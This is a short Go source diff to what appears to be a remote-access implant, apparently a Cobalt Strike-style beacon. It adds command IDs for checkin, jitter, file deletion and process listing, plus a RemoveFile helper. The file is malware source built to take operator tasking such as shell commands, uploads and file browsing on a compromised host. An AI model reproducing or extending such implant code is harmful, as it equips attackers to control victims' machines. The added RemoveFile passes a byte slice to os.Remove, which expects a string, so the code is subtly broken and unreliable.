@@ -15,6 +15,8 @@ import (
 
 const (
 	CMD_TYPE_SLEEP        = 4
+	CMD_TYPE_DATA_JITTER  = 6
+	CMD_TYPE_CHECKIN	  = 8
 	CMD_TYPE_SHELL        = 78
 	CMD_TYPE_UPLOAD_START = 10
 	CMD_TYPE_UPLOAD_LOOP  = 67
@@ -23,6 +25,8 @@ const (
 	CMD_TYPE_CD           = 5
 	CMD_TYPE_PWD          = 39
 	CMD_TYPE_FILE_BROWSE  = 53
+	CMD_TYPE_RM			  = 56
+	CMD_TYPE_LIST_PROCESS = 32
 )
 
 func ParseCommandShell(b []byte) (string, []byte) {
@@ -127,6 +131,13 @@ func GetCurrentDirectory() []byte {
 		return nil
 	}
 	return []byte(result)
+}
+
+func RemoveFile(path []byte) {
+	err := os.Remove(path)
+	if err != nil {
+		processErrorTest(err.Error())
+	}
 }
 
 func File_Browse(b []byte) []byte {
